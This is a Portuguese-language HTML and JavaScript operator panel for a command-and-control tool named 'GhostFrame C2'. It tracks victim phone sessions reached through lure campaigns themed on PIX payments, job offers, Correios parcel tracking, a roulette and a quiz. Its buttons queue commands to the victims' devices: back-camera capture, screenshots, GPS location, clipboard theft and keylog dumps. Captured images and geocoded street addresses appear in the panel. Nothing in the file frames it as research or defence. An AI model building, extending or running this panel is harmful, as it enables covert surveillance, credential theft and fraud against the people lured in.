<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GhostFrame C2 — Painel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;padding:16px}
h1{font-size:18px;color:#f0f6fc;margin-bottom:4px}
.sub{color:#8b949e;font-size:12px;margin-bottom:16px}
.stats{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center;min-width:110px}
.stat .num{font-size:22px;font-weight:700;color:#58a6ff}
.stat .lbl{font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:1px;margin-top:2px}
.cards{display:flex;gap:14px;align-items:flex-start;flex-wrap:wrap}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;min-width:320px;flex:1}
.card h3{font-size:14px;color:#f0f6fc;margin-bottom:12px;border-bottom:1px solid #30363d;padding-bottom:8px}
table{width:100%;border-collapse:collapse}
th{font-size:11px;text-transform:uppercase;color:#8b949e;text-align:left;padding:6px 8px;border-bottom:1px solid #30363d}
td{padding:6px 8px;border-bottom:1px solid #21262d;font-size:13px;vertical-align:top}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
.badge.on{background:#1f6feb22;color:#58a6ff;border:1px solid #1f6feb}
.badge.off{background:#21262d;color:#8b949e;border:1px solid #30363d}
.badge.camp{background:#23863622;color:#3fb950;border:1px solid #238636}
.btn{border:none;border-radius:6px;padding:5px 10px;font-size:12px;font-weight:600;cursor:pointer;background:#21262d;color:#c9d1d9;border:1px solid #30363d;margin:1px}
.btn:hover{border-color:#58a6ff;color:#58a6ff}
.btn.primary{background:#238636;color:#fff;border-color:#238636}
.btn.danger{background:#da3633;color:#fff;border-color:#da3633}
input,select,textarea{background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;padding:8px 10px;font-size:13px;width:100%;margin-bottom:8px}
input:focus,select:focus,textarea:focus{border-color:#58a6ff;outline:none}
label{display:block;font-size:11px;color:#8b949e;margin-bottom:3px;text-transform:uppercase;letter-spacing:0.5px}
.row{display:flex;gap:8px}
.row>*{flex:1}
.result{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:6px 8px;margin-top:4px;font-size:11px;color:#8b949e;word-break:break-all;max-height:120px;overflow:auto}
.result img{max-width:100%;max-height:200px;border-radius:6px;display:block;margin:4px 0}
.result .cmd{color:#58a6ff;font-weight:600}
.tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
.tab{padding:6px 14px;border-radius:20px;font-size:12px;cursor:pointer;background:#21262d;color:#8b949e;border:1px solid #30363d}
.tab.active{background:#1f6feb;color:#fff;border-color:#1f6feb}
.toast{position:fixed;bottom:16px;right:16px;background:#238636;color:#fff;padding:10px 18px;border-radius:8px;font-size:13px;display:none;z-index:99;box-shadow:0 4px 12px rgba(0,0,0,.4)}
.hidden{display:none}
</style>
</head>
<body>

<h1>🖥️ GhostFrame C2 — Painel v5</h1>
<div class="sub">Polling REST 2s • Auto-recon • 5 campanhas</div>

<div class="stats">
  <div class="stat"><div class="num" id="stTotal">0</div><div class="lbl">Sessões</div></div>
  <div class="stat"><div class="num" id="stOnline">0</div><div class="lbl">Online</div></div>
  <div class="stat"><div class="num" id="stResults">0</div><div class="lbl">Resultados</div></div>
</div>

<div class="tabs" id="campTabs">
  <div class="tab active" data-camp="all">Todos</div>
  <div class="tab" data-camp="pix">🏦 PIX</div>
  <div class="tab" data-camp="emprego">💼 Emprego</div>
  <div class="tab" data-camp="rastreio">📦 Correios</div>
  <div class="tab" data-camp="roleta">🎰 Roleta</div>
  <div class="tab" data-camp="quiz">🎯 Quiz</div>
</div>

<div class="cards">
  <!-- SESSIONS -->
  <div class="card" style="flex:2">
    <h3>📡 Sessões / Beacons</h3>
    <div style="overflow-x:auto">
    <table id="sessTable">
      <thead><tr><th>SID</th><th>Campanha</th><th>Status</th><th>UA</th><th>Último visto</th><th>Últ. resultado</th><th>Ações</th></tr></thead>
      <tbody id="sessBody"></tbody>
    </table>
    </div>
    <div id="detailArea" class="hidden" style="margin-top:14px">
      <h3 id="detailTitle">Detalhes</h3>
      <div id="detailBody"></div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
var currentCamp='all';
var sessionCache={};

function api(url, opts){
  return fetch(url, opts).then(function(r){return r.json()}).catch(function(){return {}});
}

function shortUa(ua){
  if(!ua)return '-';
  var m=ua.match(/Android\s([\d.]+)/);
  if(m)return 'Android '+m[1];
  if(ua.indexOf('iPhone')>-1)return 'iOS';
  if(ua.indexOf('Linux')>-1)return 'Linux';
  if(ua.indexOf('Windows')>-1)return 'Windows';
  return ua.slice(0,24);
}

function esc(s){
  return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

var geoCache={};
var _geoQueue=[];
function geocodeAddress(lat,lng,elId){
  var key=lat.toFixed(5)+','+lng.toFixed(5);
  var el=document.getElementById(elId);
  if(!el)return;
  if(geoCache[key]){el.innerHTML='<b>📍</b> '+esc(geoCache[key]);return}
  fetch('/api/geocode?lat='+lat+'&lng='+lng).then(function(r){return r.json()}).then(function(d){
    if(d&&d.ok){geoCache[key]=d.address;el.innerHTML='<b>📍</b> '+esc(d.address)}
    else el.innerHTML='<span style="color:#f85149">endereço indisponível</span>';
  }).catch(function(){el.innerHTML='<span style="color:#f85149">endereço indisponível</span>'});
}
function renderResults(results){
  if(!results||!results.length)return '<div class="sub">Sem resultados ainda</div>';
  var html='';
  var locN=0;
  results.slice().reverse().forEach(function(r){
    var val=r.result||'';
    var isImg=false,isLoc=false,lat=0,lng=0,acc='';
    try{
      var j=JSON.parse(val);
      if(j.image&&j.image.length>100){isImg=true;val='<img src="'+j.image+'" style="max-width:280px;border-radius:6px">'+(j.error?'<br>'+esc(j.error):'')}
      else if(j.lat!==undefined&&j.lng!==undefined){isLoc=true;lat=Number(j.lat);lng=Number(j.lng);acc=j.accuracy?(j.accuracy+'m'):''}
      else if(j.error){val='<span style="color:#f85149">\u26a0 '+esc(j.error)+'</span>';isImg=true}
    }catch(e){}
    html+='<div class="result"><span class="cmd">'+esc(r.command)+'</span> • '+esc(new Date(r.received_at*1000).toLocaleTimeString('pt-BR'))+'<br>';
    if(isLoc){
      locN++;
      html+='<b>📍</b> '+lat.toFixed(5)+', '+lng.toFixed(5)+(acc?' · ±'+esc(acc):'')+' · <a href="https://www.google.com/maps?q='+lat+','+lng+'" target="_blank" rel="noopener">ver no mapa</a><br>';
      html+='<span id="addr-'+locN+'">traduzindo endereço…</span>';
      html+='</div>';
      (function(n,la,ln){setTimeout(function(){geocodeAddress(la,ln,'addr-'+n)},50)})(locN,lat,lng);
      return;
    }
    html+=(isImg?val:esc(val).slice(0,500))+'</div>';
  });
  return html;
}

function lastMeaningful(res){
  if(!res||!res.length)return null;
  var j=null;
  for(var i=res.length-1;i>=0;i--){
    var v=res[i].result||'';j=null;
    try{j=JSON.parse(v)}catch(e){}
    if(j&&typeof j==='object'&&j.image&&j.image.length>100)return res[i];
  }
  for(var k=res.length-1;k>=0;k--){
    var w=res[k].result||'';
    if(w&&w!=='[]'&&w!=='{}'&&w!=='null'&&w!=='undefined')return res[k];
  }
  return res[res.length-1];
}
function previewResult(r,sid){
  if(!r)return '<span style="color:#8b949e">\u2014</span>';
  var val=r.result||'';
  var j=null;
  try{j=JSON.parse(val)}catch(e){}
  if(j&&typeof j==='object'){
    if(j.image&&j.image.length>100){
      var errHtml=j.error?' <span style="color:#f85149">('+esc(j.error)+')</span>':'';
      return '<img src="'+j.image+'" style="max-height:44px;max-width:120px;border-radius:4px;vertical-align:middle">'+errHtml;
    }
    if(j.error)return '<span style="color:#f85149">\u26a0 '+esc(j.error).slice(0,60)+'</span>';
    if(j.lat!==undefined&&j.lng!==undefined){
      var elId='geo-'+String(sid).replace(/[^a-zA-Z0-9]/g,'')+'-'+String(r.command||'loc').replace(/[^a-zA-Z0-9]/g,'');
      _geoQueue.push({lat:Number(j.lat),lng:Number(j.lng),elId:elId});
      return '<span id="'+elId+'">\ud83d\udccd '+Number(j.lat).toFixed(5)+', '+Number(j.lng).toFixed(5)+'</span>';
    }
  }
  return '<span style="color:#8b949e">'+esc(val).slice(0,50)+'</span>';
}

function renderSessions(){
  api('/api/sessions').then(function(d){
    var tbody=document.getElementById('sessBody');
    var html='';
    var order=Object.keys(d).sort(function(a,b){return (d[b].last_seen||0)-(d[a].last_seen||0)});
    order.forEach(function(sid){
      var s=d[sid];
      if(currentCamp!=='all'&&s.campaign!==currentCamp)return;
      html+='<tr>'+
        '<td style="font-family:monospace;font-size:11px">'+esc(sid.slice(0,8))+'</td>'+
        '<td><span class="badge camp">'+esc(s.campaign)+'</span></td>'+
        '<td><span class="badge '+(s.online?'on':'off')+'">'+(s.online?'● online':'○ off')+'</span></td>'+
        '<td>'+esc(shortUa(s.ua))+'</td>'+
        '<td>'+esc(s.age_seconds)+'s atrás</td>'+
        '<td>'+(s.results&&s.results.length?previewResult(lastMeaningful(s.results),sid):'<span style="color:#8b949e">\u2014</span>')+'</td>'+
        '<td><button class="btn" onclick="showDetail(\''+sid+'\')">👁</button> '+
        '<button class="btn" onclick="cmd(\''+sid+'\',\'info\')">info</button> '+
        '<button class="btn" onclick="cmd(\''+sid+'\',\'camera_back\')">📷</button> '+
        '<button class="btn" onclick="cmd(\''+sid+'\',\'screenshot\')">🖼</button> '+
        '<button class="btn" onclick="cmd(\''+sid+'\',\'location\')">📍</button> '+
        '<button class="btn" onclick="cmd(\''+sid+'\',\'clipboard\')">📋</button> '+
        '<button class="btn" onclick="cmd(\''+sid+'\',\'keylog_dump\')">⌨</button>'+
        '</td></tr>';
      sessionCache[sid]=s;
    });
    tbody.innerHTML=html||'<tr><td colspan="7" class="sub">Nenhuma sessão. Abra um beacon no celular.</td></tr>';
    _geoQueue.forEach(function(q){geocodeAddress(q.lat,q.lng,q.elId)});
    _geoQueue=[];
    document.getElementById('stTotal').textContent=Object.keys(d).length;
    var online=0,results=0;
    Object.keys(d).forEach(function(k){if(d[k].online)online++;results+=d[k].results_received});
    document.getElementById('stOnline').textContent=online;
    document.getElementById('stResults').textContent=results;
  });
}

function showDetail(sid){
  var s=sessionCache[sid];if(!s)return;
  document.getElementById('detailArea').classList.remove('hidden');
  document.getElementById('detailTitle').textContent='Detalhes — '+sid.slice(0,12);
  var html='<div style="font-size:12px;color:#8b949e;margin-bottom:8px">';
  html+='<b>UA:</b> '+esc(s.ua)+'<br>';
  html+='<b>IP:</b> '+esc(s.ip)+' • <b>Campanha:</b> '+esc(s.campaign)+' • <b>Comandos:</b> '+s.commands_sent+' • <b>Resultados:</b> '+s.results_received+'<br>';
  html+='<b>Path:</b> '+esc(s.path)+'<br><b>Referrer:</b> '+esc(s.referrer);
  html+='</div>';
  html+=renderResults(s.results);
  document.getElementById('detailBody').innerHTML=html;
}

function cmd(sid,name){
  api('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sid,command:name})}).then(function(r){
    toast('Comando '+name+' enfileirado');
  });
}

function toast(msg,isErr){
  var t=document.getElementById('toast');
  t.textContent=msg;
  t.style.background=isErr?'#da3633':'#238636';
  t.style.display='block';
  setTimeout(function(){t.style.display='none'},2500);
}

document.getElementById('campTabs').addEventListener('click',function(e){
  var t=e.target.closest('.tab');if(!t)return;
  document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active')});
  t.classList.add('active');
  currentCamp=t.dataset.camp;
  renderSessions();
});

renderSessions();
setInterval(renderSessions,2000);
</script>
</body>
</html>
